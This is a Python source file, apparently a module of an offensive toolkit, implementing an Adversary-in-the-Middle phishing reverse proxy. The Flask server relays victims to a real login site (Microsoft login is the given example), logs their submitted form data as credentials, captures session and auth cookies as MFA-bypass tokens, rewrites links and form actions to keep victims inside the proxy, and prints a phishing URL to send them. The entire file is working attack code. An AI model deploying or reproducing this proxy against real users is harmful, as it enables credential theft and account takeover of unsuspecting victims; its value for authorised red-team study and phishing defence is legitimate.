import os
import logging
import requests
import questionary
import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from flask import Flask, request, Response
from rich.console import Console
from core.ui import draw_header, Q_STYLE
from core.database import db

# Suppress noisy Flask development logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
app = Flask(__name__)

# Global state to share between the Flask routes and the CLI
class AitMState:
    target_url = ""
    target_domain = ""
    captured_creds = 0

state = AitMState()

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    """The core Adversary-in-the-Middle reverse proxy engine."""
    
    # 1. Construct the real destination URL
    url = f"{state.target_url}/{path}"
    if request.query_string:
        url += f"?{request.query_string.decode('utf-8')}"

    # 2. INTERCEPT POST REQUESTS (Credential Harvesting)
    if request.method == 'POST':
        form_data = request.form.to_dict()
        if form_data:
            state.captured_creds += 1
            console.print(f"\n[bold red][!] INTERCEPTED POST DATA (Possible Credentials) from {request.remote_addr}:[/bold red]")
            for key, value in form_data.items():
                # Avoid printing massive hidden viewstates, focus on user inputs
                if len(value) < 200: 
                    console.print(f"    [white]{key}:[/white] [bold yellow]{value}[/bold yellow]")
            
            # Log credentials securely to the database
            cred_log = "\n".join([f"{k}: {v}" for k, v in form_data.items() if len(v) < 200])
            db.log("AitM-Proxy", request.remote_addr, f"Captured Form Submission:\n{cred_log}", "CRITICAL")

    # 3. Forward the exact request to the real server
    # We strip the 'Host' header so the target server doesn't get confused
    headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
    
    try:
        if request.method == 'GET':
            resp = requests.get(url, headers=headers, cookies=request.cookies, allow_redirects=False, verify=False)
        else:
            resp = requests.post(url, headers=headers, data=request.form, cookies=request.cookies, allow_redirects=False, verify=False)
    except Exception as e:
        return f"Proxy Route Error: {e}", 500

    # 4. INTERCEPT SET-COOKIE HEADERS (MFA Session Stealing)
    if 'Set-Cookie' in resp.headers:
        cookie_data = resp.headers['Set-Cookie']
        # Flag high-value session cookies
        if any(x in cookie_data.lower() for x in ['session', 'token', 'auth']):
            console.print(f"\n[bold magenta][!] INTERCEPTED AUTHENTICATION COOKIE (MFA BYPASS TOKEN)![/bold magenta]")
            console.print(f"    [dim]{cookie_data[:150]}...[/dim]")
            db.log("AitM-Proxy", request.remote_addr, f"Captured Auth Cookie: {cookie_data}", "CRITICAL")

    # 5. On-the-fly HTML Rewriting (Keep the victim trapped in the proxy)
    content = resp.content
    if 'text/html' in resp.headers.get('Content-Type', '').lower():
        soup = BeautifulSoup(content, 'html.parser')
        
        # Rewrite all internal links to point to our proxy instead of the real domain
        for tag in soup.find_all(['a', 'link'], href=True):
            href = tag['href']
            if state.target_domain in href:
                tag['href'] = href.replace(f"https://{state.target_domain}", "").replace(f"http://{state.target_domain}", "")
        
        # Rewrite form submission actions so passwords are sent to us
        for form in soup.find_all('form', action=True):
            action = form['action']
            if state.target_domain in action:
                form['action'] = action.replace(f"https://{state.target_domain}", "").replace(f"http://{state.target_domain}", "")
            
        content = soup.encode('utf-8')

    # 6. Reconstruct the response and send it back to the victim
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
    
    return Response(content, resp.status_code, headers)

def run_cloner():
    draw_header("Adversary-in-the-Middle (AitM) Reverse Proxy")
    
    console.print("[dim]This module deploys a dynamic reverse proxy to intercept web traffic.[/dim]")
    console.print("[dim]It transparently forwards the victim to the real site while harvesting credentials and MFA Session Cookies.[/dim]\n")

    target = questionary.text("Target URL to Proxy/Clone (e.g., https://login.microsoftonline.com):", style=Q_STYLE).ask()
    if not target: return
    
    if not target.startswith("http"):
        target = "https://" + target
        
    state.target_url = target.rstrip('/')
    state.target_domain = urlparse(state.target_url).netloc

    port_str = questionary.text("Local port to host the proxy on (Default 80):", default="80", style=Q_STYLE).ask()
    if not port_str: return
    port = int(port_str)

    console.print(f"\n[bold green][*] Initializing AitM Proxy Engine...[/bold green]")
    console.print(f"[*] Phishing URL (Send this to the victim): [bold cyan]http://<YOUR_IP>:{port}/[/bold cyan]")
    console.print(f"[*] Proxying all traffic transparently to: [white]{state.target_url}[/white]")
    console.print("[bold yellow][!] Listening for credentials and MFA session cookies... (Press Ctrl+C to stop)[/bold yellow]\n")

    try:
        # Launch the highly-threaded Flask proxy server
        app.run(host='0.0.0.0', port=port, threaded=True)
    except PermissionError:
        console.print("[bold red][!] Permission denied. Binding to port 80 requires 'sudo'.[/bold red]")
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Shutting down AitM Proxy...[/yellow]")
    except Exception as e:
        console.print(f"\n[bold red][!] Proxy Error:[/bold red] {e}")

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

if __name__ == "__main__":
    run_cloner()